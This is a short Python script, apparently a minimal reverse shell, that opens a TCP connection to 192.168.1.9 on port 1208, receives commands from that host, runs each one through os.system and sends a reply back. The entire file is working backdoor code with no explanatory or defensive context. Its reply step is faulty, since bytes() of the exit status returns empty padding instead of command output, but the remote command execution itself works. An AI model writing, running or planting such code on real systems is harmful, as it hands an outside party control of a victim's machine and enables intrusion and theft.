import socket,os
def main():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(("192.168.1.9", 1208))
    while True:
        cmd = s.recv(1024)
        CMD = os.system(cmd.decode())
        s.send(bytes(CMD))
if __name__ == "__main__":
    main()